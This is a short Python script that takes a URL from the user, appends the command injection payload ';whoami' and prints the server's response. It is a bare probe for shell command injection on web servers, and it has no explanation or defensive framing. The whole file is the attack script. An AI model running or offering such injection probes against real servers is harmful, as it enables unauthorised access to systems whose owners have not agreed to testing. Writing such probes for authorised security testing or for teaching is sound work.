import requests

url = input("URL: ")
payload = ";whoami"

response = requests.get(url + payload)
print(response.text)
